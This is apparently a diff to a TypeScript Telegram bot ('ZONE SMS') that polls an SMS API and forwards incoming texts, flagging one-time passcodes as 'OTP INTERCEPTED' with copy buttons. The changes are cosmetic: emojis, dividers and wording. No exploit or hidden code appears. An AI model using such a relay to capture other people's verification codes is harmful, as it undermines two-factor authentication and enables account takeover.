@@ -126,32 +126,32 @@ function formatTime(ts: string): string {
 function formatOtpMessage(sms: SmsMessage): string {
   const otp = extractOtp(sms.body)!;
   return (
-    `⚡️ <b>OTP INTERCEPTED</b> ⚡️\n` +
-    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
-    `📱  <b>Phone</b>   <code>${escapeHtml(sms.phone)}</code>\n` +
-    `🕐  <b>Time</b>    ${escapeHtml(formatTime(sms.timestamp))}\n` +
+    `🔐 <b>OTP INTERCEPTED</b> ⚡️\n` +
+    `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
+    `📲  <b>Phone</b>   <code>${escapeHtml(sms.phone)}</code>\n` +
+    `🕰  <b>Time</b>    ${escapeHtml(formatTime(sms.timestamp))}\n` +
     `📡  <b>SIM</b>     ${escapeHtml(sms.sim)}\n` +
-    `📲  <b>Device</b>  ${escapeHtml(sms.device)}\n` +
-    `💳  <b>Plan</b>    ${escapeHtml(sms.plan)}\n` +
-    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `📟  <b>Device</b>  ${escapeHtml(sms.device)}\n` +
+    `💰  <b>Plan</b>    ${escapeHtml(sms.plan)}\n` +
+    `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
     `💬  <b>Message</b>\n` +
     `<i>${escapeHtml(sms.body)}</i>\n` +
-    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
     `🔑  <b>OTP CODE  →  </b><code>${escapeHtml(otp)}</code>\n` +
-    `        <i>⬆️ Tap code to copy instantly</i>`
+    `        ⬆️  <i>Tap code to copy instantly</i>`
   );
 }
 
 function formatSmsMessage(sms: SmsMessage): string {
   return (
-    `📨 <b>NEW MESSAGE</b>\n` +
-    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
-    `📱  <b>Phone</b>   <code>${escapeHtml(sms.phone)}</code>\n` +
-    `🕐  <b>Time</b>    ${escapeHtml(formatTime(sms.timestamp))}\n` +
+    `📩 <b>NEW SMS</b>\n` +
+    `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
+    `📲  <b>Phone</b>   <code>${escapeHtml(sms.phone)}</code>\n` +
+    `🕰  <b>Time</b>    ${escapeHtml(formatTime(sms.timestamp))}\n` +
     `📡  <b>SIM</b>     ${escapeHtml(sms.sim)}\n` +
-    `📲  <b>Device</b>  ${escapeHtml(sms.device)}\n` +
-    `💳  <b>Plan</b>    ${escapeHtml(sms.plan)}\n` +
-    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `📟  <b>Device</b>  ${escapeHtml(sms.device)}\n` +
+    `💰  <b>Plan</b>    ${escapeHtml(sms.plan)}\n` +
+    `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
     `💬  <b>Message</b>\n` +
     `<i>${escapeHtml(sms.body)}</i>`
   );
@@ -163,10 +163,10 @@ function buildOtpKeyboard(sms: SmsMessage, storeId: string): TelegramBot.InlineK
     inline_keyboard: [
       [
         { text: `🔑 Copy OTP`, callback_data: safeCallbackData("otp:", otp) },
-        { text: `📱 Copy Number`, callback_data: safeCallbackData("num:", sms.phone) },
+        { text: `📲 Copy Number`, callback_data: safeCallbackData("num:", sms.phone) },
       ],
       [
-        { text: `💬 Copy Message`, callback_data: `msg:${storeId}` },
+        { text: `💬 Copy Full Message`, callback_data: `msg:${storeId}` },
       ],
     ],
   };
@@ -176,7 +176,7 @@ function buildSmsKeyboard(sms: SmsMessage, storeId: string): TelegramBot.InlineK
   return {
     inline_keyboard: [
       [
-        { text: `📱 Copy Number`, callback_data: safeCallbackData("num:", sms.phone) },
+        { text: `📲 Copy Number`, callback_data: safeCallbackData("num:", sms.phone) },
         { text: `💬 Copy Message`, callback_data: `msg:${storeId}` },
       ],
     ],
@@ -222,10 +222,10 @@ function buildStatsMessage(total: string, displayed: string, otps: number, sessi
     `📩  Total SMS        →  <b>${escapeHtml(total)}</b>\n` +
     `📋  Displayed        →  <b>${escapeHtml(displayed)}</b>\n` +
     `🔐  OTPs detected    →  <b>${otps}</b>\n` +
-    `📨  New this session →  <b>${sessionSms}</b>\n` +
+    `🆕  New this session →  <b>${sessionSms}</b>\n` +
     `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
-    `🟢  Status   <b>ACTIVE</b>\n` +
-    `⏱   Refresh  <b>Every 5 seconds</b>\n` +
+    `🟢  Status   →  <b>ACTIVE</b>\n` +
+    `⚡️  Refresh  →  <b>Every 5 seconds</b>\n` +
     `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰`
   );
 }
@@ -476,23 +476,23 @@ export function startTelegramBot(webhookUrl?: string): TelegramBot | null {
     }
 
     const welcome =
-      `\n` +
-      `🛰  <b>SMS MONITOR BOT</b>  🛰\n` +
+      `🛡  <b>ZONE SMS — BOT ACTIVE</b>  🛡\n` +
       `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
-      `🟢  <b>STATUS  —  ONLINE &amp; ACTIVE</b>\n` +
+      `🟢  <b>STATUS  —  ONLINE &amp; MONITORING</b>\n` +
       `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n` +
-      `✦  <b>FEATURES</b>\n` +
-      `  🔄  Auto-refresh every <b>5 seconds</b>\n` +
+      `💎  <b>FEATURES</b>\n` +
+      `  ⚡️  Auto-refresh every <b>5 seconds</b>\n` +
       `  🔐  OTP auto-detection &amp; highlight\n` +
       `  📋  One-tap copy  (OTP / Number / Message)\n` +
       `  📊  Live SMS &amp; OTP statistics\n` +
-      `  🌐  Multi-language SMS support\n\n` +
-      `✦  <b>COMMANDS</b>\n` +
+      `  🌐  Multi-language SMS support\n` +
+      `  👥  Owner-gated access control\n\n` +
+      `📌  <b>COMMANDS</b>\n` +
       `  /stats   →  Live stats &amp; OTP count\n` +
-      `  /status  →  Health check\n` +
-      `  /help    →  All commands\n\n` +
+      `  /status  →  System health check\n` +
+      `  /help    →  Full command guide\n\n` +
       `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
-      `✅  <i>Monitoring your inbox 24/7. Every new SMS will appear here automatically.</i>`;
+      `✅  <i>Monitoring 24/7 — every new SMS appears here instantly.</i>`;
     await bot.sendMessage(userId, welcome, { parse_mode: "HTML" });
   });
 
@@ -502,14 +502,14 @@ export function startTelegramBot(webhookUrl?: string): TelegramBot | null {
     const help =
       `📖  <b>COMMANDS &amp; GUIDE</b>\n` +
       `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
-      `✦  <b>BOT COMMANDS</b>\n` +
+      `📌  <b>BOT COMMANDS</b>\n` +
       `  /start   →  Welcome screen\n` +
-      `  /stats   →  SMS &amp; OTP stats\n` +
-      `  /status  →  Monitoring health\n` +
+      `  /stats   →  Live SMS &amp; OTP stats\n` +
+      `  /status  →  System health check\n` +
       `  /help    →  This guide\n\n` +
-      `✦  <b>BUTTON ACTIONS</b>\n` +
+      `🖱  <b>BUTTON ACTIONS</b>\n` +
       `  🔑  <i>Copy OTP</i>      →  tappable OTP code\n` +
-      `  📱  <i>Copy Number</i>   →  tappable phone number\n` +
+      `  📲  <i>Copy Number</i>   →  tappable phone number\n` +
       `  💬  <i>Copy Message</i>  →  full message as tappable code\n\n` +
       `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
       `💡  <i>Tap any</i> <code>highlighted code</code> <i>to copy instantly.</i>`;
@@ -536,14 +536,14 @@ export function startTelegramBot(webhookUrl?: string): TelegramBot | null {
   bot.onText(/\/status/, async (msg) => {
     if (!isAllowed(msg.from!.id)) return;
     const status =
-      `🛰  <b>SYSTEM HEALTH CHECK</b>\n` +
+      `🛡  <b>SYSTEM HEALTH CHECK</b>\n` +
       `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
       `🤖  Bot         🟢  <b>Online</b>\n` +
       `📡  SMS API     🟢  <b>Connected</b>\n` +
-      `⏱   Poll rate   🟢  <b>Every 5 sec</b>\n` +
+      `⚡️  Poll rate   🟢  <b>Every 5 sec</b>\n` +
       `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
       `🔐  OTPs detected    →  <b>${otpCount}</b>\n` +
-      `📨  SMS this session →  <b>${totalSmsToday}</b>\n` +
+      `📩  SMS this session →  <b>${totalSmsToday}</b>\n` +
       `👥  Approved users   →  <b>${approvedUsers.size}</b>\n` +
       `⏳  Pending requests →  <b>${pendingUsers.size}</b>\n` +
       `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n` +
